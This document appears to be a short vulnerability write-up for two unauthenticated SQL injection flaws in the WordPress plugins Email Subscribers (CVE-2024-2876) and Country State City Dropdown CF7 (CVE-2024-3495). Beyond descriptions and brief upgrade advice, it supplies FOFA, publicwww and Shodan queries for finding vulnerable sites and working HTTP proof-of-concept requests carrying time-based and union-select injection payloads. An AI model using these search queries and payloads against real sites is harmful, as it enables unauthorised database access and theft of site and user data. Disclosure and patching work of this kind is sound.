### Description CVE-2024-2876
The Email Subscribers by Icegram Express – Email Marketing, Newsletters, Automation for WordPress & WooCommerce plugin for WordPress is vulnerable to SQL Injection 
via the 'run' function of the 'IG_ES_Subscribers_Query' class in all versions up to, and including, 5.7.14 due to insufficient escaping on the user supplied parameter and lack of sufficient 
preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.

### Description CVE-2024-3495
The Country State City Dropdown CF7 plugin for WordPress is vulnerable to SQL Injection via the ‘cnt’ and 'sid' parameters in versions up to, and including, 2.7.2 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.

### Query CVE-2024-2876
- FOFA : body="/wp-content/plugins/email-subscribers/"
- publicwww : "/wp-content/plugins/email-subscribers/"
### ### Query CVE-2024-3495
- FOFA : body="/wp-content/plugins/country-state-city-auto-dropdown" && header="HTTP/1.1 200 OK"
- Publicwww : "/wp-content/plugins/country-state-city-auto-dropdown"
- shodan : "http.title:admin-ajax.php"

### Proof of concept CVE-2024-2876
```bash
@timeout: 20s (using burpsuite)
POST /wp-admin/admin-post.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

page=es_subscribers&is_ajax=1&action=_sent&advanced_filter[conditions][0][0][field]=status=99924)))union(select(sleep(4)))--+&advanced_filter[conditions][0][0][operator]==&advanced_filter[conditions][0][0][value]=1111
```
### Proof of concept CVE 2024-CVE-2024-3495
```bash
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=tc_csca_get_cities&nonce_ajax={{nonce}}&sid=1+or+0+union+select+concat(0x64617461626173653a,(select%20md5({{num}})),0x7c76657273696f6e3a,(select%20md5({{num}})),0x7c757365723a,user()),2,3--+-
```

### How to fix ?
- Since all versions up to 5.7.14 were detected with the CVE, it’s recommended for users to upgrade the Email Subscribers by Icegram Express plug-in to version 5.7.15 (or the most recent release 5.7.19).
- Patchstack users have the option to enable automatic updates specifically for vulnerable plugins.
- Implement a WAF/WAAP solution as an additional layer of protection. The advantage of such solutions is that even if the vulnerability is new and unknown (0-day), it may still prevent attacks by detecting exploitation patterns and techniques.

### Bounty Info 
https://www.wordfence.com/blog/2024/04/1250-bounty-awarded-for-unauthenticated-sql-injection-vulnerability-patched-in-email-subscribers-by-icegram-express-wordpress-plugin/
